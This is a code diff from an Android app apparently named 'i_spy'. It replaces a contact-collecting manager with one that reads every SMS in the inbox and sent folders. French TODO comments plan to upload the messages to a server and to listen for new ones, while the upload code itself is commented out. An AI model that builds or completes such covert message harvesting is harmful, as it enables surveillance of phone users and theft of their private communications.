@@ -1,105 +1,86 @@
 package com.um.asn.i_spy.manager;
 
 
-import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.ConnectivityManager;
-import android.net.NetworkInfo;
-import android.os.Build;
-import android.provider.ContactsContract;
-import android.telephony.PhoneNumberUtils;
+import android.net.Uri;
 
-import com.um.asn.i_spy.Config;
-import com.um.asn.i_spy.database_helper.DatabaseHelper;
-import com.um.asn.i_spy.http_methods.HttpPostTask;
-import com.um.asn.i_spy.http_methods.HttpPutTask;
-import com.um.asn.i_spy.models.Contact;
+import com.um.asn.i_spy.models.Message;
 import com.um.asn.i_spy.models.Phone;
 
-import org.json.JSONArray;
-import org.json.JSONException;
-import org.json.JSONObject;
-
 import java.util.ArrayList;
-import java.util.Locale;
-import java.util.concurrent.ExecutionException;
 
-public class ContactManager {
+public class MessageManager {
 
     public Context context;
     public ConnectivityManager cm;
     public Phone phone;
-    public ArrayList<Contact> contacts;
+    public ArrayList<Message> messages;
 
-    public ContactManager(Context context, Phone phone) {
+    public MessageManager(Context context, Phone phone) {
         this.context = context;
         this.phone = phone;
         this.cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
-        this.contacts = new ArrayList<Contact>();
+        this.messages = new ArrayList<Message>();
     }
 
     public void run() {
-        if (setContacts())
-            insertUpdate();
+        if (setMessages())
+            return;//insertUpdate();
     }
 
-    public boolean setContacts() {
-        ContentResolver cr = context.getContentResolver();
-        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-
-        if (cur.getCount() > 0) {
-            while (cur.moveToNext()) {
-                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
-                    Contact contact = new Contact();
-
-                    contact.setIdRef(cur.getInt(cur.getColumnIndex(ContactsContract.Contacts._ID)));
-                    contact.setNom(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
-
-                    Cursor pCur = cr.query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                            null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                            new String[]{cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID))},
-                            null
-                    );
-
-                    while (pCur.moveToNext()) {
-                        if (!pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).equals("")) {
-                            String num = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            String numE164 = "";
-                            String numFormat = "";
-
-                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                                numFormat = PhoneNumberUtils.formatNumberToE164(num, Locale.getDefault().getCountry());
-                                if (numFormat == null)
-                                    numFormat = PhoneNumberUtils.formatNumber(num, Locale.getDefault().getCountry());
-                            } else {
-                                numFormat = PhoneNumberUtils.formatNumber(num);
-                            }
-
-                            contact.setNumero(numFormat);
-                            break;
-                        }
-                    }
-
-                    pCur.close();
-                    contact.setPhone(this.phone);
-
-                    this.contacts.add(contact);
-                }
-            }
+    public boolean setMessages() {
+        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+        if (cursor.moveToFirst()) {
+            do {
+                Message message = new Message(
+                        cursor.getString(cursor.getColumnIndex("address")),
+                        cursor.getInt(cursor.getColumnIndex("type")),
+                        cursor.getInt(cursor.getColumnIndex("date")),
+                        cursor.getString(cursor.getColumnIndex("body")),
+                        this.phone,
+                        cursor.getInt(cursor.getColumnIndex("_id"))
+                );
+                this.messages.add(message);
+            } while (cursor.moveToNext());
+        } else {
+            System.out.println("NO MESSAGE INBOX");
         }
-        return this.contacts.size() > 0;
+
+        Cursor cursor2 = context.getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);
+        if (cursor2.moveToFirst()) { // must check the result to prevent exception
+            do {
+                Message message = new Message(
+                        cursor2.getString(cursor2.getColumnIndex("address")),
+                        cursor2.getInt(cursor2.getColumnIndex("type")),
+                        cursor2.getInt(cursor2.getColumnIndex("date")),
+                        cursor2.getString(cursor2.getColumnIndex("body")),
+                        this.phone,
+                        cursor2.getInt(cursor2.getColumnIndex("_id"))
+                );
+                this.messages.add(message);
+            } while (cursor2.moveToNext());
+        } else {
+            System.out.println("NO SENT");
+        }
+        return false;
     }
 
-    public void insertUpdate() {
+    // TODO :
+    // 1. Récupérer tous les messages actuels
+    // 2. Essayer de les envoyer sur le serveur, si fail save en local
+    // 3. Listener sur messages reçus et messages envoyés, essayer envoyer sur serveur, si fail save en local
+    // 4. Quand réseau dispo, envoyer les messages, et vider la base
+
+
+    /*public void insertUpdate() {
         DatabaseHelper myBD = new DatabaseHelper(this.context);
 
         ArrayList<Contact> contactToUpdate = new ArrayList<Contact>();
         ArrayList<Contact> contactToInsert = new ArrayList<Contact>();
-        for (Contact contact : this.contacts) {
-            Contact contactBD = myBD.getByIdRefContact(contact.getIdRef());
+        for (Message message : this.messages) {
+            Contact contactBD = myBD.getByIdRefContact(message.getIdRef());
             if (contactBD != null) {
                 try {
                     if (!contact.isSame(contactBD)) {
@@ -113,7 +94,7 @@ public class ContactManager {
             }
         }
 
-        System.out.println("Nombre de contacts : " + this.contacts.size());
+        System.out.println("Nombre de contacts : " + this.messages.size());
         System.out.println("Nombre de nouveaux contacts : " + contactToInsert.size());
         System.out.println("Nombre de contacts à mettre à jour : " + contactToUpdate.size());
 
@@ -180,8 +161,8 @@ public class ContactManager {
 
     public void insertLocal() {
         DatabaseHelper myBD = new DatabaseHelper(this.context);
-        myBD.insertContact(this.contacts.get(0));
+        myBD.insertContact(this.messages.get(0));
         System.out.println("Contact saved local (" + myBD.getAllContact().size() + ")");
-    }
+    }*/
 
 }
